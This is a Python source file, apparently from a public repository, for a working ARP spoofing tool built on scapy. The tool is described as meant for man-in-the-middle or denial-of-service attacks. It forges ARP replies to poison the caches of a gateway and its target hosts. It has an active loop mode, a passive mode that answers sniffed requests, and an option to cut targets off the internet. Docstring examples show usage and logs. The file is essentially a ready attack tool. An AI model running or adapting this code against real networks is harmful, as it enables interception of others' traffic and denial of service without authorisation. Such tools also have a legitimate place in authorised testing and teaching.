#!/usr/bin/env python3
# -*- coding: utf-8 -*-

###################
#    This package implements an ARP Spoofer for MIM or DoS attacks
#    Copyright (C) 2021, 2022  Maurice Lambert

#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.

#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.

#    You should have received a copy of the GNU General Public License
#    along with this program.  If not, see <https://www.gnu.org/licenses/>.
###################

"""
This package implements an ARP Spoofer for MIM
(Man-In-the-Middle) or DoS (Denial of Service) attacks.

>>> from scapy.all import conf
>>> from ArpSpoof import SpooferARP

PythonToolsKit  Copyright (C) 2022  Maurice Lambert
This program comes with ABSOLUTELY NO WARRANTY.
This is free software, and you are welcome to redistribute it
under certain conditions.


ArpSpoof  Copyright (C) 2021, 2022  Maurice Lambert
This program comes with ABSOLUTELY NO WARRANTY.
This is free software, and you are welcome to redistribute it
under certain conditions.

>>> spoofer = SpooferARP('127.0.0.1', '127.0.0.2')
>>> spoofer.active_cache_poisonning()
[2022-06-22 11:13:25] WARNING  (30) {ArpSpoof - ArpSpoof.py:323} Start ARP spoof... Gateway: 127.0.0.1 [ff:ff:ff:ff:ff:ff]. Targets: 127.0.0.2.
Traceback (most recent call last):
  ...
KeyboardInterrupt
>>> spoofer = SpooferARP('127.0.0.1', '127.0.0.2,127.0.0.3')
>>> spoofer.active_cache_poisonning()
[2022-06-22 11:13:25] WARNING  (30) {ArpSpoof - ArpSpoof.py:323} Start ARP spoof... Gateway: 127.0.0.1 [ff:ff:ff:ff:ff:ff]. Targets: 127.0.0.2, 127.0.0.3.
Traceback (most recent call last):
  ...
KeyboardInterrupt
>>> spoofer = SpooferARP('127.0.0.1', '127.0.0.2-127.0.0.5')
>>> spoofer.active_cache_poisonning()
[2022-06-22 11:13:25] WARNING  (30) {ArpSpoof - ArpSpoof.py:323} Start ARP spoof... Gateway: 127.0.0.1 [ff:ff:ff:ff:ff:ff]. Targets: 127.0.0.2, 127.0.0.3, 127.0.0.4.
Traceback (most recent call last):
  ...
KeyboardInterrupt
>>> spoofer = SpooferARP('127.0.0.1', '127.0.0.0/30')
>>> spoofer.active_cache_poisonning()
[2022-06-22 11:13:25] WARNING  (30) {ArpSpoof - ArpSpoof.py:323} Start ARP spoof... Gateway: 127.0.0.1 [ff:ff:ff:ff:ff:ff]. Targets: 127.0.0.1, 127.0.0.2.
Traceback (most recent call last):
  ...
KeyboardInterrupt
>>> spoofer = SpooferARP('172.16.10.1', '172.16.0.35', conf.iface, False, 0.5)
>>> spoofer.passive_cache_poisonning(asynchronous=True)
[2022-06-22 11:13:25] WARNING  (30) {ArpSpoof - ArpSpoof.py:380} Start passive ARP spoof... Gateway: 172.16.10.1 [None]. Targets: 172.16.0.35.
>>> spoofer.run = False
>>> spoofer.sniffer.stop()  # only with asynchronous mode
<Sniffed: TCP:0 UDP:0 ICMP:0 Other:0>
>>> spoofer.restore()       # only with asynchronous mode

~# python3 ArpSpoof.py 127.0.0.1 127.0.0.2

PythonToolsKit  Copyright (C) 2022  Maurice Lambert
This program comes with ABSOLUTELY NO WARRANTY.
This is free software, and you are welcome to redistribute it
under certain conditions.


ArpSpoof  Copyright (C) 2021  Maurice Lambert
This program comes with ABSOLUTELY NO WARRANTY.
This is free software, and you are welcome to redistribute it
under certain conditions.

[2022-06-22 11:12:13] WARNING  (30) {__main__ - ArpSpoof.py:209} Start ARP spoof... Gateway: 127.0.0.1 [ff:ff:ff:ff:ff:ff]. Targets: 127.0.0.2.
[2022-06-22 11:12:13] WARNING  (30) {__main__ - ArpSpoof.py:471} End of ARP spoofing. Restore ARP table...
[2022-06-22 11:13:25] CRITICAL (50) {__main__ - ArpSpoof.py:473} End of ARP spoofing. The ARP tables are restored.

~# python3 ArpSpoof.py -v 127.0.0.1 127.0.0.2,127.0.0.5

PythonToolsKit  Copyright (C) 2022  Maurice Lambert
This program comes with ABSOLUTELY NO WARRANTY.
This is free software, and you are welcome to redistribute it
under certain conditions.


ArpSpoof  Copyright (C) 2021, 2022  Maurice Lambert
This program comes with ABSOLUTELY NO WARRANTY.
This is free software, and you are welcome to redistribute it
under certain conditions.

[2022-06-22 11:12:13] DEBUG    (10) {__main__ - ArpSpoof.py:433} Logging is configured.
[2022-06-22 11:12:13] INFO     (20) {__main__ - ArpSpoof.py:435} Network interface is configured (IP: 169.254.155.222, MAC: e8:6a:64:bc:b5:fa and name: WiFi or WiFi)
[2022-06-22 11:12:13] DEBUG    (10) {__main__ - ArpSpoof.py:151} Get IP and MAC addresses...
[2022-06-22 11:12:13] INFO     (20) {__main__ - ArpSpoof.py:160} Gateway: 127.0.0.1 [ff:ff:ff:ff:ff:ff]
[2022-06-22 11:12:13] INFO     (20) {__main__ - ArpSpoof.py:161} Spoof: 127.0.0.2, 127.0.0.5
[2022-06-22 11:12:13] DEBUG    (10) {__main__ - ArpSpoof.py:180} Start packets crafting for 127.0.0.2 [ff:ff:ff:ff:ff:ff]...
[2022-06-22 11:12:13] DEBUG    (10) {__main__ - ArpSpoof.py:180} Start packets crafting for 127.0.0.5 [ff:ff:ff:ff:ff:ff]...
[2022-06-22 11:12:13] INFO     (20) {__main__ - ArpSpoof.py:194} Packets are built.
[2022-06-22 11:12:13] WARNING  (30) {__main__ - ArpSpoof.py:202} Start ARP spoof... Gateway: 127.0.0.1 [ff:ff:ff:ff:ff:ff]. Targets: 127.0.0.2, 127.0.0.5.
[2022-06-22 11:12:13] DEBUG    (10) {__main__ - ArpSpoof.py:228} Send ARP packet to spoof target '127.0.0.2'...
[2022-06-22 11:12:13] INFO     (20) {__main__ - ArpSpoof.py:236} Spoof '127.0.0.2' for '127.0.0.1'
[2022-06-22 11:12:13] DEBUG    (10) {__main__ - ArpSpoof.py:228} Send ARP packet to spoof target '127.0.0.5'...
[2022-06-22 11:12:13] INFO     (20) {__main__ - ArpSpoof.py:236} Spoof '127.0.0.5' for '127.0.0.1'
[2022-06-22 11:12:13] DEBUG    (10) {__main__ - ArpSpoof.py:240} Send ARP packet to spoof gateway '127.0.0.1'...
[2022-06-22 11:12:13] INFO     (20) {__main__ - ArpSpoof.py:250} Spoof '127.0.0.1' for '127.0.0.2'
[2022-06-22 11:12:13] DEBUG    (10) {__main__ - ArpSpoof.py:240} Send ARP packet to spoof gateway '127.0.0.1'...
[2022-06-22 11:12:13] INFO     (20) {__main__ - ArpSpoof.py:250} Spoof '127.0.0.1' for '127.0.0.5'
[2022-06-22 11:12:13] DEBUG    (10) {__main__ - ArpSpoof.py:228} Send ARP packet to spoof target '127.0.0.2'...
[2022-06-22 11:12:13] INFO     (20) {__main__ - ArpSpoof.py:236} Spoof '127.0.0.2' for '127.0.0.1'
[2022-06-22 11:12:13] DEBUG    (10) {__main__ - ArpSpoof.py:228} Send ARP packet to spoof target '127.0.0.5'...
[2022-06-22 11:12:13] INFO     (20) {__main__ - ArpSpoof.py:236} Spoof '127.0.0.5' for '127.0.0.1'
[2022-06-22 11:12:13] DEBUG    (10) {__main__ - ArpSpoof.py:240} Send ARP packet to spoof gateway '127.0.0.1'...
[2022-06-22 11:12:13] INFO     (20) {__main__ - ArpSpoof.py:250} Spoof '127.0.0.1' for '127.0.0.2'
[2022-06-22 11:12:13] DEBUG    (10) {__main__ - ArpSpoof.py:240} Send ARP packet to spoof gateway '127.0.0.1'...
[2022-06-22 11:12:13] INFO     (20) {__main__ - ArpSpoof.py:250} Spoof '127.0.0.1' for '127.0.0.5'
[2022-06-22 11:12:13] WARNING  (30) {__main__ - ArpSpoof.py:464} End of ARP spoofing. Restore ARP table...
[2022-06-22 11:12:13] DEBUG    (10) {__main__ - ArpSpoof.py:337} Restoring ARP tables for the target...
[2022-06-22 11:12:13] DEBUG    (10) {__main__ - ArpSpoof.py:345} Restore '127.0.0.1' for '127.0.0.2' (0/6)...
[2022-06-22 11:12:13] DEBUG    (10) {__main__ - ArpSpoof.py:345} Restore '127.0.0.1' for '127.0.0.5' (0/6)...
[2022-06-22 11:13:23] DEBUG    (10) {__main__ - ArpSpoof.py:345} Restore '127.0.0.1' for '127.0.0.2' (1/6)...
[2022-06-22 11:13:23] DEBUG    (10) {__main__ - ArpSpoof.py:345} Restore '127.0.0.1' for '127.0.0.5' (1/6)...
[2022-06-22 11:13:23] DEBUG    (10) {__main__ - ArpSpoof.py:345} Restore '127.0.0.1' for '127.0.0.2' (2/6)...
[2022-06-22 11:13:23] DEBUG    (10) {__main__ - ArpSpoof.py:345} Restore '127.0.0.1' for '127.0.0.5' (2/6)...
[2022-06-22 11:13:24] DEBUG    (10) {__main__ - ArpSpoof.py:345} Restore '127.0.0.1' for '127.0.0.2' (3/6)...
[2022-06-22 11:13:24] DEBUG    (10) {__main__ - ArpSpoof.py:345} Restore '127.0.0.1' for '127.0.0.5' (3/6)...
[2022-06-22 11:13:24] DEBUG    (10) {__main__ - ArpSpoof.py:345} Restore '127.0.0.1' for '127.0.0.2' (4/6)...
[2022-06-22 11:13:24] DEBUG    (10) {__main__ - ArpSpoof.py:345} Restore '127.0.0.1' for '127.0.0.5' (4/6)...
[2022-06-22 11:13:25] DEBUG    (10) {__main__ - ArpSpoof.py:345} Restore '127.0.0.1' for '127.0.0.2' (5/6)...
[2022-06-22 11:13:25] DEBUG    (10) {__main__ - ArpSpoof.py:345} Restore '127.0.0.1' for '127.0.0.5' (5/6)...
[2022-06-22 11:13:25] DEBUG    (10) {__main__ - ArpSpoof.py:345} Restore '127.0.0.1' for '127.0.0.2' (6/6)...
[2022-06-22 11:13:25] DEBUG    (10) {__main__ - ArpSpoof.py:345} Restore '127.0.0.1' for '127.0.0.5' (6/6)...
[2022-06-22 11:13:25] CRITICAL (50) {__main__ - ArpSpoof.py:466} End of ARP spoofing. The ARP tables are restored.

~# python3 ArpSpoof.py 127.0.0.1 127.0.0.2-127.0.0.5

PythonToolsKit  Copyright (C) 2022  Maurice Lambert
This program comes with ABSOLUTELY NO WARRANTY.
This is free software, and you are welcome to redistribute it
under certain conditions.


ArpSpoof  Copyright (C) 2021, 2022  Maurice Lambert
This program comes with ABSOLUTELY NO WARRANTY.
This is free software, and you are welcome to redistribute it
under certain conditions.

[2022-06-22 11:12:13] WARNING  (30) {__main__ - ArpSpoof.py:202} Start ARP spoof... Gateway: 127.0.0.1 [ff:ff:ff:ff:ff:ff]. Targets: 127.0.0.2, 127.0.0.3, 127.0.0.4.
[2022-06-22 11:12:13] WARNING  (30) {__main__ - ArpSpoof.py:464} End of ARP spoofing. Restore ARP table...
[2022-06-22 11:13:25] CRITICAL (50) {__main__ - ArpSpoof.py:466} End of ARP spoofing. The ARP tables are restored.

~# python3 ArpSpoof.py 127.0.0.1 -t 1 127.0.0.0/29

PythonToolsKit  Copyright (C) 2022  Maurice Lambert
This program comes with ABSOLUTELY NO WARRANTY.
This is free software, and you are welcome to redistribute it
under certain conditions.


ArpSpoof  Copyright (C) 2021, 2022  Maurice Lambert
This program comes with ABSOLUTELY NO WARRANTY.
This is free software, and you are welcome to redistribute it
under certain conditions.

[2022-06-22 11:12:13] WARNING  (30) {__main__ - ArpSpoof.py:202} Start ARP spoof... Gateway: 127.0.0.1 [ff:ff:ff:ff:ff:ff]. Targets: 127.0.0.1, 127.0.0.2, 127.0.0.3, 127.0.0.4, 127.0.0.5, 127.0.0.6.
[2022-06-22 11:12:13] WARNING  (30) {__main__ - ArpSpoof.py:464} End of ARP spoofing. Restore ARP table...
[2022-06-22 11:13:25] CRITICAL (50) {__main__ - ArpSpoof.py:466} End of ARP spoofing. The ARP tables are restored.

~# python ArpSpoof.py 127.0.0.1 127.0.0.2,127.0.0.3 -p -s -v -t 1 -i 127.0.0.

PythonToolsKit  Copyright (C) 2022  Maurice Lambert
This program comes with ABSOLUTELY NO WARRANTY.
This is free software, and you are welcome to redistribute it
under certain conditions.


ArpSpoof  Copyright (C) 2021, 2022  Maurice Lambert
This program comes with ABSOLUTELY NO WARRANTY.
This is free software, and you are welcome to redistribute it
under certain conditions.

[2022-06-22 11:12:13] DEBUG    (10) {__main__ - ArpSpoof.py:541} Logging is configured.
[2022-06-22 11:12:13] INFO     (20) {__main__ - ArpSpoof.py:543} Network interface is configured (IP: , MAC:  and name: loopback or loopback)
[2022-06-22 11:12:13] DEBUG    (10) {__main__ - ArpSpoof.py:243} Get IP and MAC addresses...
[2022-06-22 11:12:13] INFO     (20) {__main__ - ArpSpoof.py:252} Gateway: 127.0.0.1 [ff:ff:ff:ff:ff:ff]
[2022-06-22 11:12:13] INFO     (20) {__main__ - ArpSpoof.py:253} Spoof: 127.0.0.2, 127.0.0.3
[2022-06-22 11:12:13] DEBUG    (10) {__main__ - ArpSpoof.py:272} Start packets crafting for 127.0.0.2 [ff:ff:ff:ff:ff:ff]...
[2022-06-22 11:12:13] DEBUG    (10) {__main__ - ArpSpoof.py:272} Start packets crafting for 127.0.0.3 [ff:ff:ff:ff:ff:ff]...
[2022-06-22 11:12:13] INFO     (20) {__main__ - ArpSpoof.py:286} Packets are built.
[2022-06-22 11:12:13] WARNING  (30) {__main__ - ArpSpoof.py:351} Start passive ARP spoof... Gateway: 127.0.0.1 [ff:ff:ff:ff:ff:ff]. Targets: 127.0.0.2, 127.0.0.3.
[2022-06-22 11:12:15] INFO     (20) {__main__ - ArpSpoof.py:399} Spoof 127.0.0.1 for 127.0.0.3
[2022-06-22 11:12:15] INFO     (20) {__main__ - ArpSpoof.py:399} Spoof 127.0.0.1 for 127.0.0.3
[2022-06-22 11:12:16] INFO     (20) {__main__ - ArpSpoof.py:406} Spoof 127.0.0.2 for 127.0.0.1
[2022-06-22 11:12:16] INFO     (20) {__main__ - ArpSpoof.py:406} Spoof 127.0.0.2 for 127.0.0.1
[2022-06-22 11:12:16] DEBUG    (10) {__main__ - ArpSpoof.py:445} Restoring ARP tables...
[2022-06-22 11:12:16] DEBUG    (10) {__main__ - ArpSpoof.py:453} Restore '127.0.0.1' for '127.0.0.2' (0/6)...
[2022-06-22 11:12:16] DEBUG    (10) {__main__ - ArpSpoof.py:453} Restore '127.0.0.1' for '127.0.0.3' (0/6)...
[2022-06-22 11:12:17] DEBUG    (10) {__main__ - ArpSpoof.py:453} Restore '127.0.0.1' for '127.0.0.2' (1/6)...
[2022-06-22 11:12:17] DEBUG    (10) {__main__ - ArpSpoof.py:453} Restore '127.0.0.1' for '127.0.0.3' (1/6)...
[2022-06-22 11:12:18] DEBUG    (10) {__main__ - ArpSpoof.py:453} Restore '127.0.0.1' for '127.0.0.2' (2/6)...
[2022-06-22 11:12:18] DEBUG    (10) {__main__ - ArpSpoof.py:453} Restore '127.0.0.1' for '127.0.0.3' (2/6)...
[2022-06-22 11:12:18] DEBUG    (10) {__main__ - ArpSpoof.py:453} Restore '127.0.0.1' for '127.0.0.2' (3/6)...
[2022-06-22 11:12:18] DEBUG    (10) {__main__ - ArpSpoof.py:453} Restore '127.0.0.1' for '127.0.0.3' (3/6)...
[2022-06-22 11:12:19] DEBUG    (10) {__main__ - ArpSpoof.py:453} Restore '127.0.0.1' for '127.0.0.2' (4/6)...
[2022-06-22 11:12:19] DEBUG    (10) {__main__ - ArpSpoof.py:453} Restore '127.0.0.1' for '127.0.0.3' (4/6)...
[2022-06-22 11:12:19] DEBUG    (10) {__main__ - ArpSpoof.py:453} Restore '127.0.0.1' for '127.0.0.2' (5/6)...
[2022-06-22 11:12:19] DEBUG    (10) {__main__ - ArpSpoof.py:453} Restore '127.0.0.1' for '127.0.0.3' (5/6)...
[2022-06-22 11:12:20] DEBUG    (10) {__main__ - ArpSpoof.py:453} Restore '127.0.0.1' for '127.0.0.2' (6/6)...
[2022-06-22 11:12:20] DEBUG    (10) {__main__ - ArpSpoof.py:453} Restore '127.0.0.1' for '127.0.0.3' (6/6)...
[2022-06-22 11:12:20] WARNING  (30) {__main__ - ArpSpoof.py:572} End of ARP spoofing. Restore ARP table...
"""

__version__ = "1.1.1"
__author__ = "Maurice Lambert"
__author_email__ = "mauricelambert434@gmail.com"
__maintainer__ = "Maurice Lambert"
__maintainer_email__ = "mauricelambert434@gmail.com"
__description__ = """
This package implements an ARP Spoofer for MIM
(Man-In-the-Middle) or DoS (Denial of Service) attacks.
"""
license = "GPL-3.0 License"
__url__ = "https://github.com/mauricelambert/ArpSpoof"

copyright = """
ArpSpoof  Copyright (C) 2021, 2022  Maurice Lambert
This program comes with ABSOLUTELY NO WARRANTY.
This is free software, and you are welcome to redistribute it
under certain conditions.
"""
__license__ = license
__copyright__ = copyright

__all__ = ["SpooferARP"]

from scapy.all import (
    Ether,
    ARP,
    sendp,
    conf,
    getmacbyip,
    Packet,
    sniff,
    AsyncSniffer,
)
from PythonToolsKit.GetType import get_ipv4_addresses
from PythonToolsKit.ScapyTools import ScapyArguments
from PythonToolsKit.Logs import get_custom_logger
from scapy.interfaces import NetworkInterface
from logging import Logger, DEBUG, WARNING
from collections.abc import Callable
from ipaddress import IPv4Address
from socket import gethostbyname
from argparse import Namespace
from typing import ValuesView
from functools import partial
from time import sleep
from sys import exit

conf_iface: NetworkInterface = conf.iface


class SpooferARP:

    """
    This class implements a arp spoofer.
    """

    def __init__(
        self,
        gateway: str,
        targets: str,
        iface: NetworkInterface = conf_iface,
        semi: bool = False,
        inter: float = 0.5,
    ):
        self.semi = semi
        self.inter = inter
        self.iface = iface
        self.gateway_name = gateway

        try:
            gateway = self.gateway = str(IPv4Address(gateway))
        except ValueError:
            gateway = self.gateway = gethostbyname(gateway)

        # try:
        #     ip_spoof = self.ip_spoof = str(ip_address(ip_spoof))
        # except ValueError:
        #     ip_spoof = self.ip_spoof = gethostbyname(ip_spoof)

        try:
            targets_object = get_ipv4_addresses(targets)
        except ValueError as e:
            logger_error(
                f"Invalid IP addresses or network: {e.__class__.__name__}: {e}"
            )

        logger_debug("Get IP and MAC addresses...")

        # self.my_ip = iface.ip
        self.my_mac = iface.mac or '00:00:00:00:00:00'
        gateway_mac = self.gateway_mac = getmacbyip(gateway, chainCC=1)
        spoof_addresses = self.spoof_addresses = {
            str(ip): getmacbyip(str(ip), chainCC=1) for ip in targets_object
        }

        logger_info(f"Gateway: {gateway} [{gateway_mac}]")
        logger_info(f"Spoof: {', '.join(list(spoof_addresses))}")

        self.run = True

        self.build_packets()

    def build_packets(self) -> None:

        """
        This function crafts packets.
        """

        packets_spoof_gateway = self.packets_spoof_gateway = {}
        packets_spoof_targets = self.packets_spoof_targets = {}
        my_mac = self.my_mac
        gateway = self.gateway
        gateway_mac = self.gateway_mac

        for ip, mac in self.spoof_addresses.items():
            logger_debug(f"Start packets crafting for {ip} [{mac}]...")

            packets_spoof_gateway[ip] = Ether(dst=mac, src=my_mac) / ARP(
                op=2, pdst=ip, psrc=gateway, hwsrc=my_mac
            )
            packets_spoof_targets[ip] = Ether(
                dst=gateway_mac, src=my_mac
            ) / ARP(
                op=2,
                pdst=gateway,
                psrc=ip,
                hwsrc=my_mac,
            )

        logger_info("Packets are built.")

    def active_cache_poisonning(self) -> None:

        """
        This function start active ARP cache poisonning attack.
        """

        logger_warning(
            f"Start ARP spoof... Gateway: {self.gateway} [{self.gateway_mac}]"
            f". Targets: {', '.join(list(self.spoof_addresses))}."
        )

        active_spoof = self.active_spoof
        inter = self.inter

        while self.run:
            active_spoof()
            sleep(inter)

        logger_warning("End of ARP spoofing. Restore ARP tables...")
        self.restore()
        logger_critical("End of ARP spoofing. The ARP tables are restored.")

    def active_spoof(self) -> None:

        """
        This function send spoofed packets in active cache poisonning attack.
        """

        iface = self.iface
        gateway = self.gateway

        for ip, packet in self.packets_spoof_targets.items():
            logger_debug(f"Send ARP packet to spoof target {ip!r}...")

            sendp(
                packet,
                iface=iface,
                verbose=0,
            )

            logger_info(f"Spoof {ip!r} for {gateway!r}")

        if not self.semi:
            for ip, packet in self.packets_spoof_gateway.items():
                logger_debug(
                    f"Send ARP packet to spoof gateway {gateway!r}..."
                )

                sendp(
                    packet,
                    iface=iface,
                    verbose=0,
                )

                logger_info(f"Spoof {gateway!r} for {ip!r}")

    def passive_cache_poisonning(self, asynchronous: bool = False) -> None:

        """
        This function implements a passive cache poisonning attack.
        """

        lfilter = partial(self.filter, mac_addresses=self.spoof_addresses.values())
        logger_warning(
            f"Start passive ARP spoof... Gateway: {self.gateway} "
            f"[{self.gateway_mac}]. Targets: "
            f"{', '.join(list(self.spoof_addresses))}."
        )

        if asynchronous:
            self.sniffer = AsyncSniffer(
                store=False,
                lfilter=lfilter,
                stop_filter=lambda x: self.run,
                prn=self.passive_spoof,
                iface=self.iface,
            )
            self.sniffer.start()
        else:
            sniff(
                store=False,
                lfilter=lfilter,
                stop_filter=lambda x: not self.run,
                prn=self.passive_spoof,
                iface=self.iface,
            )
            self.restore()

    def passive_spoof(self, packet: Packet) -> None:

        """
        This function spoofs ARP in passive mode.
        """

        gateway = self.gateway
        arp = packet[ARP]
        source = arp.psrc

        if source == gateway:
            destination = arp.pdst
            sendp(
                self.packets_spoof_gateway[destination],
                iface=self.iface,
                verbose=0,
            )
            logger_info(f"Spoof {gateway} for {destination}")
        else:
            sendp(
                self.packets_spoof_targets[source],
                iface=self.iface,
                verbose=0,
            )
            logger_info(f"Spoof {source} for {gateway}")

    def filter(self, packet: Packet, mac_addresses: ValuesView = ()) -> bool:

        """
        This function implements a filter for passive attack.
        """

        if packet.haslayer(ARP):
            getlayer = packet.getlayer
            arp = getlayer(ARP)
            ethernet = getlayer(Ether)

            return arp.op == 1 and (
                (ethernet.src in mac_addresses and arp.pdst == self.gateway)
                or (
                    ethernet.src == self.gateway_mac
                    and arp.pdst in self.spoof_addresses
                )
            )

        return False

    def restore(self) -> None:

        """
        This function restore ARP tables after ARP cache poisonning.
        """

        logger_debug("Restoring ARP tables...")
        gateway_mac = self.gateway_mac
        gateway = self.gateway
        iface = self.iface
        semi = self.semi

        for count in range(7):
            for ip, mac in self.spoof_addresses.items():
                logger_debug(f"Restore {gateway!r} for {ip!r} ({count}/6)...")

                sendp(
                    Ether(src=gateway_mac, dst=mac)
                    / ARP(
                        op=2,
                        pdst=ip,
                        psrc=gateway,
                        hwsrc=gateway_mac,
                    ),
                    iface=iface,
                    verbose=0,
                )

                if not semi:
                    logger_debug(
                        f"Restore {ip!r} for {gateway!r} ({count}/6)..."
                    )
                    sendp(
                        Ether(src=mac, dst=gateway_mac)
                        / ARP(
                            op=2,
                            pdst=gateway,
                            psrc=ip,
                            hwsrc=mac,
                        ),
                        iface=iface,
                        verbose=0,
                    )

            sleep(0.5)


def parse_args() -> Namespace:

    """
    This function parses command line arguments.
    """

    parser = ScapyArguments()
    add_argument = parser.add_argument
    add_argument("gateway", help="Gateway IP or hostname")
    add_argument(
        "targets",
        help=(
            "Targets IP addresses (examples: 127.0.0.1 127.0.0.1/29 "
            "127.0.0.1-127.0.0.9 127.0.0.1,127.0.0.2)"
        ),
    )
    add_argument(
        "--verbose",
        "-v",
        help="Mode verbose (print debug message)",
        action="store_true",
    )
    add_argument(
        "--time",
        "-t",
        help="Time in seconds to sleep between sending ARP packets.",
        type=float,
        default=0.5,
    )
    add_argument(
        "--semi",
        "-s",
        help="Spoof IP of the gateway (target will lost internet connection).",
        action="store_true",
    )
    add_argument(
        "--passive",
        "-p",
        help="Passive mode (response to ARP request only)",
        action="store_true",
    )
    return parser.parse_args()


def main() -> int:

    """
    This function performs a arp spoofing from the command line.
    """

    arguments = parse_args()
    iface = arguments.iface

    logger.setLevel(DEBUG if arguments.verbose else WARNING)

    logger_debug("Logging is configured.")

    logger_info(
        f"Network interface is configured (IP: {iface.ip}, MAC:"
        f" {iface.mac} and name: {iface.name} or {iface.network_name})"
    )

    spoofer = SpooferARP(
        arguments.gateway,
        arguments.targets,
        iface,
        arguments.semi,
        arguments.time,
    )

    if arguments.passive:
        attribute = "passive_cache_poisonning"
    else:
        attribute = "active_cache_poisonning"

    try:
        getattr(spoofer, attribute)()
    except KeyboardInterrupt:
        spoofer.run = False
        sniffer = getattr(spoofer, "sniffer", None)
        if sniffer:
            sniffer.stop()
    except Exception as e:
        from traceback import print_exc
        print_exc()
    finally:
        logger_warning("End of ARP spoofing. Restore ARP table...")
        spoofer.restore()
        logger_critical("End of ARP spoofing. The ARP tables are restored.")
        return 0

    return 1


logger: Logger = get_custom_logger(__name__)
logger_debug: Callable = logger.debug
logger_info: Callable = logger.info
logger_warning: Callable = logger.warning
logger_error: Callable = logger.error
logger_critical: Callable = logger.critical

print(copyright)

if __name__ == "__main__":
    exit(main())
